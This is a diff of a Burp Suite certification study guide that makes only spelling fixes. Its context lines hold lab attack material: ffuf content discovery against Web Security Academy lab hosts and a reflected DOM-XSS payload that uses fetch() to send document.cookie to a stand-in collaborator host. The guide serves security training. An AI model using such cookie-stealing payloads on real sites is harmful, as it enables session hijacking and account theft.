@@ -58,7 +58,7 @@ wget https://raw.githubusercontent.com/botesjuan/Burp-Suite-Certified-Practition
 ffuf -c -w ./burp-labs-wordlist.txt -u https://TARGET.web-security-academy.net/FUZZ
 ```  
 
->Burp engagement tool, content discovery using my compiled wordlist [burp-labs-wordlist](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/burp-labs-wordlist.txt) as custom file list.  
+>Burp engagement tool, content discovery using my compiled word list [burp-labs-wordlist](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/burp-labs-wordlist.txt) as custom file list.  
 
 ![content-discovery.png](images/content-discovery.png)  
 
@@ -76,7 +76,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 >Always open `source code` to look for any developer comments that reveal hidden files or paths. Below example lead to [symphony token deserialization](#deserialization).  
 
-![dev-code-debug-comment deserial](images/dev-code-debug-comment.png)  
+![dev-code-debug-comment de-serial](images/dev-code-debug-comment.png)  
   
 -----
 
@@ -302,7 +302,7 @@ From the Site Map, open the `searchResults.js` file and notice that the JSON res
 \"-fetch('https://COLLABORATOR.com?reflects='+document.cookie)}//
 ```  
 
->In the above payload every character is URL encoded and used as the search parameter value. This target do not have an exploit server, so I hosted my own `python3 -m http.server 80` web service and save the `index.html` file that contain the `location` target url between `<script>` tags. 
+>In the above payload every character is URL encoded and used as the search parameter value. This target do not have an exploit server, so I hosted my own `python3 -m http.server 80` web service and save the `index.html` file that contain the `location` target URL between `<script>` tags. 
 
 ![Reflected DOM-XSS JSON cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
 
